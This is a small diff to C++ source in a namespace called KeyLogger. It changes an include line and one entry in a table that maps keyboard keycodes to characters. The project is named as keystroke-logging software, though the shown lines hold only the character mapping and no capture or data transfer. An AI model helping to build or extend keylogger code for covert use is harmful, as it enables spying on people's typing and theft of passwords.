@@ -1,4 +1,4 @@
-#include "logger.hpp"
+#include "logger.h"
 
 namespace KeyLogger {
 
@@ -88,7 +88,7 @@ namespace KeyLogger {
             case 35:  return "p";
             case 37:  return "l";
             case 38:  return "j";
-            case 39:  return "'";
+            case 39:  return "\"";
             case 40:  return "k";
             case 41:  return ";";
             case 42:  return "\\";
